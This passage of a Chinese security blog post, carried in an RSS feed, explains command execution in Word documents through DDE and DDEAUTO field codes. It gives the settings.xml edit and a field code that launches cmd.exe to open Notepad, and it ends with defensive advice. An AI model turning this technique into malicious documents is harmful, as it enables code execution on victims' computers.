&lt;p&gt;除了上面使用的&lt;code&gt;DDEAUTO&lt;/code&gt;，&lt;code&gt;DDE&lt;/code&gt;也有能实现这个效果，但是要多一个步骤
将文件后缀改为&lt;code&gt;zip&lt;/code&gt;或&lt;code&gt;rar&lt;/code&gt;，用&lt;code&gt;7z&lt;/code&gt;打开，修改&lt;code&gt;word/settings.xml&lt;/code&gt;文件，增加一行&lt;code&gt;&amp;lt;w:updateFields w:val=&amp;quot;true&amp;quot;/&amp;gt;&lt;/code&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/6U0%25213Q8W%7BEOM%7BJ_V@7%29G7.png&#34; alt=&#34;&#34; /&gt;
替换原来的&lt;code&gt;xml&lt;/code&gt;文件后把后缀改回来&lt;/p&gt;

&lt;p&gt;编辑文档，域代码为&lt;code&gt;{ DDE &amp;quot;c:\\windows\\system32\\cmd.exe&amp;quot; &amp;quot;/c notepad&amp;quot; }&lt;/code&gt;
效果跟上面一样&lt;/p&gt;

&lt;p&gt;类似方法除了上面两个外还有&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GLOSSARY
IMPORT
INCLUDE
SHAPE
DISPLAYBARCODE
MERGEBARCODE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参考微软文档 &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;目前不清楚这些方法有没有影响，微软认为并没有必要去修复这个“漏洞”&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Microsoft responded that as suggested it is a feature and no further action will be taken, and will be considered for a next-version candidate bug.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;最近 office 漏洞频发，建议不要打开陌生的文档包括excel，ppt等，如有必要在保护视图中查看，另外及时更新系统补丁&lt;/p&gt;

&lt;p&gt;参考：
&lt;a href=&#34;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&#34;&gt;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
  </channel>
</rss>